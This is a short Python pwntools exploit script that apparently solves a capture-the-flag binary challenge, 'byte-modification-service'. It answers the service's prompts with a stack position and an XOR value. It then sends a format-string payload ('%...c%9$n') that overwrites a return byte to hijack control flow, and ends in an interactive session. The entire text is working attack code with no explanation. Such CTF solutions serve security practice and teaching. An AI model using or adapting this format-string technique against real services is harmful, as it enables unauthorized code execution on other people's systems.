from pwn import *

REMOTE = True

if REMOTE:
    r = remote("byte-modification-service.challs.csc.tf", 1337)
    pos = 0x2B
    payload = f"%{0x8c2 - 1}c%9$n".encode()  # c2 08: ret 0x8 (for stack alignment)
else:
    r = process("./attachment/chall")
    pos = 0x2D
    payload = f"%{0xc3 - 1}c%9$n".encode()  # c3: ret

sla = r.sendlineafter
sa = r.sendafter

idx = 0
xor_with = 0x401155 ^ 0x401124

sla(b"which stack position do you want to use?\n", str(pos).encode())
sla(b"Byte Index?\n", str(idx).encode())
sla(b"xor with?\n", str(xor_with).encode())
sa(b"finally, do you have any feedback? it will surely help us improve our service.\n", payload + b"A@")
r.recvuntil(b"A")

r.interactive()
